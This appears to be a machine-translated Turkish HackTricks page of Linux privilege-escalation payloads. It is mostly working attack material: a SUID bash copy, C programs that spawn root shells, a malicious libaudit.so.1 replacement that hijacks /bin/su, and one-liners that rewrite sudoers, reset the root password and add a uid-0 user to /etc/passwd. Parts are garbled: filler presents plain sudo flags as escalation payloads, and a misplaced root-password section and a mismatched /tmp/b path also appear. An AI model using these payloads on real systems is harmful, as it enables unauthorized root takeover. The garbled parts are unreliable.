# Yürütülecek Payloadlar

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## Yürütülecek Yükler

Bu bölümde, bir hedef sistemde ayrıcalık yükseltmek için kullanılabilecek bazı yaygın yükleri bulacaksınız. Bu yükler, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken daha yüksek ayrıcalıklara erişim sağlamak için kullanılabilir.

### 1. Sudo Kullanıcı Parolası İsteme

Bu yük, hedef sistemde sudo ayrıcalıklarına sahip bir kullanıcının parolasını istemek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken sudo komutlarını çalıştırabilirsiniz.

```bash
sudo -S command
```

### 2. Sudo Kullanıcı Parolası Olmadan

Bu yük, hedef sistemde sudo ayrıcalıklarına sahip bir kullanıcının parolasını girmeden sudo komutlarını çalıştırmak için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken sudo komutlarını çalıştırabilirsiniz.

```bash
sudo -n command
```

### 3. Sudo Kullanıcı Parolası İsteme (Root Olarak)

Bu yük, hedef sistemde root ayrıcalıklarına sahip bir kullanıcının parolasını istemek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken root ayrıcalıklarına erişim sağlayabilirsiniz.

```bash
sudo -S su
```

### 4. Sudo Kullanıcı Parolası Olmadan (Root Olarak)

Bu yük, hedef sistemde root ayrıcalıklarına sahip bir kullanıcının parolasını girmeden root ayrıcalıklarına erişmek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken root ayrıcalıklarına erişim sağlayabilirsiniz.

```bash
sudo -n su
```

### 5. Sudo Kullanıcı Parolası İsteme (Diğer Kullanıcı Olarak)

Bu yük, hedef sistemde belirli bir kullanıcının parolasını istemek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken belirli bir kullanıcının ayrıcalıklarına erişim sağlayabilirsiniz.

```bash
sudo -S -u username command
```

### 6. Sudo Kullanıcı Parolası Olmadan (Diğer Kullanıcı Olarak)

Bu yük, hedef sistemde belirli bir kullanıcının parolasını girmeden belirli bir kullanıcının ayrıcalıklarına erişmek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken belirli bir kullanıcının ayrıcalıklarına erişim sağlayabilirsiniz.

```bash
sudo -n -u username command
```

### 7. Sudo Kullanıcı Parolası İsteme (Diğer Kullanıcı Olarak, Root Olarak)

Bu yük, hedef sistemde belirli bir kullanıcının parolasını istemek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken belirli bir kullanıcının root ayrıcalıklarına erişim sağlayabilirsiniz.

```bash
sudo -S -u username su
```

### 8. Sudo Kullanıcı Parolası Olmadan (Diğer Kullanıcı Olarak, Root Olarak)

Bu yük, hedef sistemde belirli bir kullanıcının parolasını girmeden belirli bir kullanıcının root ayrıcalıklarına erişmek için kullanılır. Bu yükü kullanarak, hedef sistemdeki düşük ayrıcalıklı bir kullanıcı olarak çalışırken belirli bir kullanıcının root ayrıcalıklarına erişim sağlayabilirsiniz.

```bash
sudo -n -u username su
```
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Yetkileri yükseltmek için bir dosyayı üzerine yazma

### Yaygın dosyalar

* Şifreli kullanıcıyı _/etc/passwd_ dosyasına ekle
* Şifreyi _/etc/shadow_ dosyasında değiştir
* Kullanıcıyı _/etc/sudoers_ dosyasına ekle
* Docker soketi üzerinden docker'ı kötüye kullan, genellikle _/run/docker.sock_ veya _/var/run/docker.sock_ içerisindedir

### Bir kütüphaneyi üzerine yazma

Bazı ikili dosyalar tarafından kullanılan bir kütüphaneyi kontrol et, bu durumda `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
Bu durumda `/lib/x86_64-linux-gnu/libaudit.so.1`'i taklit etmeyi deneyelim.\
Bu kütüphanenin **`su`** ikilisi tarafından kullanılan işlevlerini kontrol edin:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Semboller `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` ve `audit_fd` muhtemelen libaudit.so.1 kütüphanesinden gelmektedir. Zararlı paylaşılan kütüphane tarafından üzerine yazılacağı için, bu semboller yeni paylaşılan kütüphanede bulunmalıdır. Aksi takdirde, program sembolü bulamayacak ve sonlanacaktır.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Şimdi, sadece **`/bin/su`** çağırarak kök olarak bir kabuk elde edeceksiniz.

## Betikler

Kök kullanıcı bir şeyi çalıştırabilir mi?

### **www-data için sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Root şifresini değiştirme**

Root şifresini değiştirmek, bir sistemdeki root kullanıcısının şifresini güncellemek anlamına gelir. Bu, kötü niyetli bir saldırganın root erişimine sahip olmasını engellemek için önemli bir adımdır. Root şifresini değiştirmek için aşağıdaki adımları izleyebilirsiniz:

1. Terminali açın ve root kullanıcısına geçiş yapın:
   ```bash
   sudo su
   ```

2. Yeni bir root şifresi belirleyin:
   ```bash
   passwd
   ```

3. Yeni şifreyi girin ve onaylayın.

Artık root şifresi değiştirildi ve güncel şifre ile root erişimine sahip olabilirsiniz.
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd'ye yeni bir kök kullanıcı ekleyin

```bash
echo 'newroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
